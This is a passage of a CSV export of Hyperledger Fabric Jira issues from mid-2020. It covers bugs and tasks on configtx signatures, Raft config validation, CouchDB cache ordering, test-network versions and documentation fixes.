_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"01/Jun/20 9:31 AM;btl5037;This is a much larger problem than I first realized:

So essentially the non-release tags of Fabric NPM Packages have a floating dependency tag. So if you pull the 2.0.0-unstable tag of fabric-client, its package.json has the `unstable` tag for its dependencies, not the `2.0.0-unstable` tag. So while you are using the `2.0.0-unstable` tag, its dependencies are resolved to `2.1.1-unstable.407` since that is the latest unstable tag. This is really bad versioning in the Node projects.

The only solution is to pull a release version that had everything we need in it, and the only thing available is the `2.0.0-beta.2` version. I recommend we pin on this until we can rewrite PTE to handle these problems.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fabric 2.0 broken doc links,FAB-17945,45167,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Duplicate,pandrejko,nileshdeotale,nileshdeotale,01/Jun/20 11:25 PM,09/Feb/21 12:23 AM,28/Oct/23 3:10 AM,09/Feb/21 12:23 AM,v2.0.0,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,Documentation,,,,,"This link and several others are broken

[https://hyperledger-fabric.readthedocs.io/en/release-2.0/understand_fabcar_network.html]

 

 ",,nileshdeotale,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18102,,,,,,,,,,,,,"01/Jun/20 11:25 PM;nileshdeotale;Screen Shot 2020-06-01 at 10.22.59 AM.png;https://jira.hyperledger.org/secure/attachment/18342/Screen+Shot+2020-06-01+at+10.22.59+AM.png",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ckj:",,,,Unset,Unset,,try going to https://hyperledger-fabric.readthedocs.io/en/release-2.0/understand_fabcar_network.html,,Unset,,,,,,Unset,,Unset,,(Please add usage information),nileshdeotale,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Jun/20 1:52 AM;pandrejko;We should add this back into the docs in some form as part of the samples update work;;;","05/Jun/20 8:39 PM;pandrejko;This topic was removed from the Fabric docs, but Nilesh found it from Google. Nonetheless, as we update the samples we should consider adding something like this.;;;","09/Feb/21 12:23 AM;pandrejko;https://jira.hyperledger.org/browse/FAB-18102;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
handle empty namespace in FullScanIterator of levels,FAB-17946,45182,,Task,In CR Review,FAB,Fabric,software,denyeart,,,Medium,,Senthil1,Senthil1,Senthil1,02/Jun/20 3:35 AM,02/Jun/20 11:29 AM,28/Oct/23 3:10 AM,,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cnv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Signatures created using fabric-config/configtx are not valid bccsp signatures,FAB-17947,45184,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,02/Jun/20 9:19 AM,04/Jun/20 6:03 AM,28/Oct/23 3:10 AM,04/Jun/20 6:03 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"While trying a few things with the configtx library in the integration tests, I noticed that the signatures created using the package are invalid as pointed out by:
{code:java}
[e][OrdererOrg.orderer] 2020-06-01 20:10:11.924 EDT [policies] SignatureSetToValidIdentities -> WARN 02d signature for identity 0 is invalid: The signature is invalid {code}
The integration test has been succeeding because *peer channel update* was automatically adding its own signatures using the existing code. 

After some investigation, I have determined the signatures are invalid because the bccsp validation code expects the signature to be on the sha256 hash of the data and not the data itself. We should update the configtx library accordingly.

Follow-on: A subsequent task will be created to modify the *peer channel update* to allow disabling the automatic signature using the local MSP.",,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17948,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzzzx",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"02/Jun/20 9:33 AM;wlahti;[https://github.com/hyperledger/fabric-config/pull/25];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Update ""peer channel update"" to allow disabling of automatic signatures",FAB-17948,45185,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,wlahti,wlahti,wlahti,02/Jun/20 9:36 AM,06/Jun/20 5:49 AM,28/Oct/23 3:10 AM,06/Jun/20 5:49 AM,,,,,,,,,,,,,,fabric-cli,,,,,,,,,0,ipm,,,,,*peer channel update* automatically creates a config signature and signs the envelope using the local MSP's default signer. The command should be updated to allow disabling this signing feature (while keeping the default behavior the same).,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17956,,,,,,,,,,,,,,,,,,,FAB-17947,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzo8",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
configtx should not require orderer endpoints or anchor peers when processing an existing config,FAB-17949,45186,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,caod,caod,02/Jun/20 11:19 AM,04/Jun/20 12:46 AM,28/Oct/23 3:10 AM,04/Jun/20 12:46 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"It seems that it's possible to create and fetch a channel config that doesn't contain orderer endpoints or anchor peers. Right now the config library requires orderer endpoints to exist when fetching orderer configuration. We should change it to optionally check for it rather than require it. For context, in fabric v1.0 orderer endpoints were specified globally at the top level of a config, in the transition to 1.4 its recommended to remove the top level orderer endpoints and specify them instead at an orderer org level. Let's also use this opportunity to slot in followup story for adding a simple removal function to the API for removing orderer endpoints from the top level should they exist (ie when a consumer is migrating from v1.0 to v1.4)",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzo9",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Jun/20 4:27 AM;caod;[https://github.com/hyperledger/fabric-config/pull/26];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support backwards compatibility in configtx by introducing API function for removing top level orderer endpoints,FAB-17950,45188,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,02/Jun/20 11:40 PM,12/Jun/20 12:07 AM,28/Oct/23 3:10 AM,12/Jun/20 12:07 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric-config API attempting to migrate a fabric 1.0 channel, I would like to use the configtx library to remove the top level orderer addresses in my 1.0 channel config in favor of later adding them to the orderer org instead. We should not allow people to update the OrdererAddresses field and instead only support a function for removing it. New genesis blocks should also be created without the top level field but instead require the orderer orgs to specify orderer endpoints (tl;dr required at org level when creating, optional when updating)

 

*Acceptance*

I should be able to call a function `RemoveLegacyOrdererAddresses` from the top level of a new ConfigTx's channel group to remove the legacy config value.",,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzoc",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jun/20 9:52 PM;tsharris;[https://github.com/hyperledger/fabric-config/pull/29];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Raft config update should be validated against correct IDs,FAB-17951,45191,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,guoger,guoger,03/Jun/20 2:41 AM,01/Jul/20 8:36 PM,28/Oct/23 3:10 AM,01/Jul/20 8:36 PM,,,,,,,,,,v2.2.0,,,,fabric-orderer,,,,,,,,,0,,,,,,"When a config update is submitted to node, it runs through [this check|https://github.com/hyperledger/fabric/blob/450ba3ae2e6434bdc0a99c4f3ebf77498d05e2ba/orderer/consensus/etcdraft/chain.go#L1304], which uses *dummy node IDs* (always starting from 1). This prevents validation from making correct decision based on current IDs in consenter set. For example, when we have [2, 3, 4] in cluster, and attempts to remove 4, this part of validation logic would believe that 3 is being removed.

In most of cases we are fine, since after all we are removing correct node with the certificate. However, if 4 happens to be offline, we would get rejected with error ""config will result in quorum loss""",,guoger,warm3snow,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17875,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01coz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),guoger,warm3snow,ymlbright,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Jun/20 2:30 AM;guoger;https://github.com/hyperledger/fabric/pull/1367;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix test-network to use the latest version of fabric-ca,FAB-17952,45192,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,03/Jun/20 2:58 AM,17/Jun/20 8:49 AM,28/Oct/23 3:10 AM,17/Jun/20 8:49 AM,v2.1.0,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"Currently, *test-network* mainly uses the previous version (1.4.6) of fabric-ca.

Also, *addOrg3.sh* in test-network is not using the *cai <ca_imagetag>* option
(This may use non-existent version or a hard-coded 1.4.4 version).

So, this should catch up with the latest version (latest or 1.4.7).",,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cp7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Write end to end Integration tests for snapshot feature,FAB-17953,45194,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,manish-sethi,manish-sethi,03/Jun/20 4:53 AM,04/Nov/20 6:28 AM,28/Oct/23 3:10 AM,04/Nov/20 6:28 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,manish-sethi,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-106,,,No,,Unset,No,,,"1|i00wur:0idqxx",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,wenjian,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Aug/20 12:19 PM;manish-sethi;List of potential integration tests

https://github.com/hyperledger/fabric-rfcs/blob/master/text/0000-ledger-checkpointing.md#integration-tests;;;","02/Oct/20 7:49 AM;wenjian;PR:

https://github.com/hyperledger/fabric/pull/1958;;;","31/Oct/20 4:07 AM;wenjian;More PRs:

https://github.com/hyperledger/fabric/pull/2052

https://github.com/hyperledger/fabric/pull/2061

https://github.com/hyperledger/fabric/pull/2064;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Non-Deterministirc Read Result When Using StateCouchDB With Cache,FAB-17954,45195,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,magpie73,magpie73,03/Jun/20 10:20 AM,03/Dec/20 12:42 PM,28/Oct/23 3:10 AM,03/Dec/20 10:20 AM,v2.0.0,v2.0.1,v2.1.0,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"*1.Condition*
 - Use HLF v2.0.0 ~
 - Use CouchDB as statedb with cache
 - Chaincode use struct as data (The fields are not ordered alphabetically)

*2. Symptom*
 - With single peer : It can occurred after calling GetState between 2 invocations of PutState on same key.
 Before 2nd PutState, the keys in the query result would be {color:#ff0000}alphabetically{color} ordered.
 After 2nd PutState, they would be ordered as {color:#ff0000}fields in struct{color}.
 But it's not a big problem.

 - Multiple peers : It can occurred one peer calling GetState between 2 invocations of PutState on same key, another peer does not.
 On this situation, GetState result from 2 peers would be different.
 And if there's an invocation that includes GetState, it would fail with the error 'Inconsistent Response Payload from Different peers.'

!image-2020-06-03-10-44-53-269.png!

*3. Reason*
 The cache of statecouchdb loads data when chaincode calls GetState, and update cache when process transaction - only the key is exist in cache.

When loading, the data is marshalled as alphabetically ordererd.( keyValToCouchDoc func )
 When updating, the data is marshalled order of fields in struct.( In the writeset )

!image-2020-06-03-10-14-49-414.png!

*4. Solutions*
 I make 2 solutions for this symptom.

*Solution 1* : Unmarshall and marshall data before update cache
      .Good points - Keep current architecture
      .Bad points - Not so efficient

*Solution 2* : Do not update cache - just remove when updated
      .Good points - Very simple 
                              No need of hold new value in committer
      .Bad points - Cache miss can be occurred one more time

I've already test both solutions, and they solve the problem.

I'm ready to contribute. :)",,btl5037,denyeart,magpie73,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Jun/20 10:15 AM;magpie73;fabcar.go;https://jira.hyperledger.org/secure/attachment/18343/fabcar.go","03/Jun/20 10:14 AM;magpie73;image-2020-06-03-10-14-49-414.png;https://jira.hyperledger.org/secure/attachment/18344/image-2020-06-03-10-14-49-414.png","03/Jun/20 10:44 AM;magpie73;image-2020-06-03-10-44-53-269.png;https://jira.hyperledger.org/secure/attachment/18346/image-2020-06-03-10-44-53-269.png",,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0idqxk",,,,Unset,Unset,v2.x,"1) Prepare chaincode ( fabcar.go in fabric-samples/tag v2.1.0 )

2) Add QueryCarByte function that does not unmarshall result bytes to struct. ( or print out byte slice in 'QueryCar' function  )

func (s *SmartContract) QueryCarByte(ctx contractapi.TransactionContextInterface, carNumber string) (string, error) {
	carAsBytes, _ := ctx.GetStub().GetState(carNumber)
	return string(carAsBytes), nil
}

3) Start fabric network ( Single peeer is enough )

4) Install and commit  the chaincode

5) Invoke InitLedger ( or CreateCar )

6) Query 'QueryCarByte' and check result ( alphabetical order )
   {""function"":""queryCarByte"",""Args"":[""CAR0""]} --> {""colour"":""blue"",""make"":""Toyota"",""model"":""Prius"",""owner"":""Tomoko""}

7) Invoke InitLedger ( or CreateCar ) again

8) Query 'QueryCarByte' again and check result ( order of fields in struct )
   {""function"":""queryCarByte"",""Args"":[""CAR0""]} --> {""make"":""Toyota"",""model"":""Prius"",""colour"":""blue"",""owner"":""Tomoko""}",,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,denyeart,magpie73,manish-sethi,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.3,release-2.2,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Jun/20 11:28 AM;btl5037;While I haven't looked at the code, my assumption here is internally we marshal the data through a generic interface and essentially the data is a map which in Go are non-deterministic. Thus the expectation is that you would marshal it into a strongly typed struct which can then be compared for determinism. If you need the the output to be deterministic, the marshaling of this strongly typed struct would give you deterministic results, as opposed to the non-deterministic nature of the generic interfaces.;;;","03/Jun/20 2:23 PM;magpie73;Thanks for the comment. :)
 This symptom is caused by using different marshalling/unmarshalling method for adding and updating the cache.

The value in the StateDB - and initially added into cache - is unmarshalled to a map then converted to bytes.  So the order of keys are alphabetical.
 [https://github.com/hyperledger/fabric/blob/master/core/ledger/kvledger/txmgmt/statedb/statecouchdb/couchdoc_conv.go |https://github.com/hyperledger/fabric/blob/master/core/ledger/kvledger/txmgmt/statedb/statecouchdb/couchdoc_conv.go]- keyValToCouchDoc() 

  type jsonValue map[string]interface{}

  jsonMap := make(jsonValue)

  json.Unmarshal(value, &jsonMap)

  jsonBytes, err := jsonMap.toBytes()

  couchDoc := &couchdb.CouchDoc\{JSONValue: jsonBytes}

 

On the contrary the value in the write set - update existing value in the cache - is marshalled in chaincode function.

So it could be follow order of struct fileds.

[https://github.com/hyperledger/fabric-samples/blob/v2.1.0/chaincode/fabcar/go/fabcar.go |https://github.com/hyperledger/fabric-samples/blob/v2.1.0/chaincode/fabcar/go/fabcar.go]- CreateCar()

  carAsBytes, _ := json.Marshal(car)

  return ctx.GetStub().PutState(carNumber, carAsBytes)

 

It can be resolved by guiding the way marshalling value in the chaincode.

But to resolve the problem completely, the code should be changed as one of my solutions.;;;","09/Jun/20 9:17 PM;denyeart;More comments in mailing list:

[https://lists.hyperledger.org/g/fabric/topic/74763904]

 ;;;","28/Sep/20 9:26 AM;magpie73;Hello.

It has been passed 3 months after last comment.
Sorry for bothering you, but I want to make things clear.

The problem is that it can makes the error 'Inconsistent Response Payload from Different peers.' under certain condition.

Can you tell me your opinion about whether this is bug or not.
And if you think this is not a bug, please change the status of this jira. :)

Thanks.;;;","05/Nov/20 8:36 AM;magpie73;[~denyeart]  

Thanks for putting this issue to a sprint and . :)

I'll try to make fix this weekend. 

Can you tell me your opinion about which is better solution for this?

 

*Solution 1* : Unmarshall and marshall data before update cache
     .Good points - Keep current architecture
     .Bad points - Not so efficient

*Solution 2* : Do not update cache - just remove when updated
     .Good points - Very simple
                             No need of hold new value in committer
     .Bad points - Cache miss can be occurred one more time

 

Thanks.;;;","18/Nov/20 2:53 AM;manish-sethi;As per the discussion on the mailing list (https://lists.hyperledger.org/g/fabric/topic/74763904) and here, this is not a bug and can be closed. 
However, it will be good to use this Jira to update the docs. [~magpie73] - do you want to submit a PR for this? 

The ""Note"" section in this page (https://github.com/hyperledger/fabric/blob/master/docs/source/couchdb_as_state_database.rst) may be a good place to add this detail (search for ""The key for a CouchDB JSON document in the above page"").;;;","01/Dec/20 12:45 AM;manish-sethi;[~denyeart]- You had expressed interest in fixing the docs. So, assigning this to you.;;;","03/Dec/20 8:49 AM;denyeart;Doc PR to address deterministic marshaling: https://github.com/hyperledger/fabric/pull/2187;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Safe access to the system channel,FAB-17955,45196,40570,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,03/Jun/20 7:00 PM,04/Jun/20 12:57 AM,28/Oct/23 3:10 AM,04/Jun/20 12:57 AM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,"Access the system channel ChainSupport under lock, as it is no longer immutable.",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cpv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix broken configtx integration test,FAB-17956,45201,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,04/Jun/20 6:15 AM,09/Jun/20 5:17 AM,28/Oct/23 3:10 AM,09/Jun/20 5:17 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As noted in FAB-17947, the signatures produced by the configtx library were previously invalid. This was masked by the fact that the peer CLI automatically signed all transactions before submitting them. There is also some sort of issue with updating anchor peers (may just be user error but I need to investigate further). For now, this task will be used to ensure we have a working integration test that truly verifies the configtx library can successfully update the config in a running fabric network.",,wlahti,,,,,,,,,,,,,,,,,,,,,FAB-17948,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzo4",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"09/Jun/20 3:29 AM;wlahti;[https://github.com/hyperledger/fabric/pull/1378];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Delete '--tls' extra arguments from fabric-samples,FAB-17957,45202,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,04/Jun/20 11:36 AM,17/Jun/20 8:47 AM,28/Oct/23 3:10 AM,17/Jun/20 8:47 AM,v2.1.1,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"""--tls"" option of the peer command does not require any argument.
On the other hand, some scripts assign the arguments.
 
The following is an example:
 
{code:bash}
… --tls $CORE_PEER_TLS_ENABLED …
{code}
 
 
I found the unwanted argument assignments in the following samples:
- test-network
- first-network
- high-throughput
- marbles_transfer
    
These unnecessary arguments should be removed. 
",,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6815,,,FAB-17958,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cr7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Delete '--tls' extra arguments from docs,FAB-17958,45207,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,05/Jun/20 1:58 AM,05/Jun/20 11:32 PM,28/Oct/23 3:10 AM,05/Jun/20 9:08 PM,v2.1.1,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"Description:
""--tls"" option of the peer command does not require any argument.
On the other hand, some instructions and command examples on documents assign the arguments.
 
The following is an example:
 
{code:bash}
… --tls true …
{code}
     
These unnecessary arguments should be removed. 
